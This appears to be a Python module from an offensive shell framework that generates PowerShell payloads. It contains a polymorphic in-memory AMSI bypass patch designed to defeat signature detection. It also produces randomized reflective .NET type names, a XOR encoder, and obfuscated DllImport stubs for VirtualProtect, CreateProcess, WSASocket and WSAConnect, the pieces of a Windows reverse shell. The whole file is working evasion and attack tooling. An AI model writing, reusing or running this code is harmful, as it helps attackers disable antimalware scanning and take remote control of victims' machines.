"""
shell.commands — helper functions, reflective .NET identifiers, dll_import
"""

import secrets
import shlex
from base64 import b64encode, b64decode
from typing import List, Tuple, Any, Generator


# ── helpers ───────────────────────────────────────────────────────────────────
def chunks(xs: bytes | list, n: int) -> Generator:
    for off in range(0, len(xs), n):
        yield xs[off:off+n]

def b64str(s: str | bytes) -> str:
    if isinstance(s, str):
        return b64encode(s.encode()).decode()
    return b64encode(s).decode()

def split_args(cmdline: str) -> List[str]:
    try:
        args = shlex.split(cmdline, posix=False)
    except ValueError:
        return []
    return [
        a[1:-1] if (a.startswith('"') and a.endswith('"')) or
                   (a.startswith("'") and a.endswith("'")) else a
        for a in args
    ]

def xorenc(xs: bytes | bytearray, key: int) -> bytes:
    return bytes(x ^ key for x in xs)

def str_b64(arg: str | bytes) -> str:
    return f"([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('{b64str(arg)}')))"


# ── polymorphic AMSI patch builder (FIX-04) ──────────────────────────────────
def build_amsi_patch() -> Tuple[str, int, int]:
    """
    Generates a polymorphic in-memory AMSI patch.
    Uses randomized NOP-equivalent instructions to defeat static byte signatures.
    Returns (arr_str, patch_len, offset).
    """
    nop_variants = [
        b'\x90',                # nop
        b'\x87\xdb',            # xchg ebx, ebx
        b'\x66\x90',            # 2-byte nop (xchg ax, ax)
        b'\x0f\x1f\x00',        # 3-byte nop
        b'\x89\xc0',            # mov eax, eax
    ]
    prefix = secrets.choice(nop_variants)
    # mov eax, 0x80070057; ret
    stub = prefix + b'\xb8\x57\x00\x07\x80\xc3'
    arr = ','.join(f'0x{b:02x}' for b in stub)
    return arr, len(stub), len(prefix)


# ── CSPRNG identifiers used for reflective .NET loading (FIX-05) ─────────────
_ns          = "A" + secrets.token_hex(secrets.randbelow(6) + 3)
_host_writer = "H" + secrets.token_hex(secrets.randbelow(6) + 3)

new_HostWriter    = f"(New-Object {_ns}.{_host_writer} {{ Write-Host -NoNewLine $args }})"
import_HostWriter = f"""
Add-Type -TypeDefinition @"
namespace {_ns} {{
public class {_host_writer} : System.IO.TextWriter {{
private System.Action<string> _act;
public {_host_writer}(System.Action<string> act) {{ _act = act; }}
public override void Write(char v)   {{ _act(v.ToString()); }}
public override void Write(string v) {{ _act(v); }}
public override void WriteLine(string v) {{ _act(v + System.Environment.NewLine); }}
public override System.Text.Encoding Encoding {{ get {{ return System.Text.Encoding.UTF8; }} }}
}}
}}
"@"""

_xor_enc = "X" + secrets.token_hex(secrets.randbelow(6) + 3)
_xor_key = secrets.randbelow(254) + 1  # range [1, 254], never 0 (FIX-05)
call_XorEnc   = f"[{_ns}.{_xor_enc}]::x"
import_XorEnc = f"""
Add-Type @"
namespace {_ns} {{
public class {_xor_enc} {{
public static byte[] x(byte[] y) {{
for(int i = 0; i < y.Length; i++) {{ y[i] ^= {_xor_key}; }}
return y;
}}
}}
}}
"@
"""

_path_fix    = "P" + secrets.token_hex(secrets.randbelow(6) + 3)
_new_PathFix = f"(New-Object {_ns}.{_path_fix})"
_importPathFix = f"""
Add-Type @"
namespace {_ns} {{
public class {_path_fix} : System.Text.UTF8Encoding {{
public override byte[] GetBytes(string s) {{
s=s.Replace("\\\\", "/");
return base.GetBytes(s);
}}
}}
}}
"@
"""


# ── dll_import: generates D/Invoke-style Add-Type payloads ───────────────────
def dll_import(ns: str, lib: str, fun: str, sigs: List[str]):
    cls   = f"f{secrets.token_hex(secrets.randbelow(6) + 3)}"
    name  = f"g{secrets.token_hex(secrets.randbelow(6) + 3)}"
    ret   = sigs[0]
    args  = ", ".join(f"{ty} x{secrets.token_hex(2)}" for ty in sigs[1:])
    dll   = "+".join(f'"{c_}"' for c_ in lib)
    entry = "+".join(f'"{c_}"' for c_ in fun)
    code  = f'[DllImport({dll},EntryPoint={entry})] public static extern {ret} {name}({args});'
    globals()["_call_"   + fun] = f"[{ns}.{cls}]::{name}"
    globals()["_import_" + fun] = f"Add-Type -Name {cls} -Namespace {ns} -Member '{code}'"


dll_import(_ns, "kernel32", "LoadLibrary",    ["IntPtr","string"])
dll_import(_ns, "kernel32", "GetProcAddress", ["IntPtr","IntPtr","string"])
dll_import(_ns, "kernel32", "VirtualProtect", ["IntPtr","IntPtr","IntPtr","uint","out uint"])
dll_import(_ns, "kernel32", "CreateProcess",  ["IntPtr","IntPtr","string","IntPtr","IntPtr","bool","uint","IntPtr","IntPtr","Int64[]","byte[]"])
dll_import(_ns, "ws2_32",   "WSAStartup",     ["IntPtr","short","byte[]"])
dll_import(_ns, "ws2_32",   "WSASocket",      ["IntPtr","uint","uint","uint","IntPtr","uint","uint"])
dll_import(_ns, "ws2_32",   "WSAConnect",     ["IntPtr","IntPtr","byte[]","int","IntPtr","IntPtr","IntPtr","IntPtr"])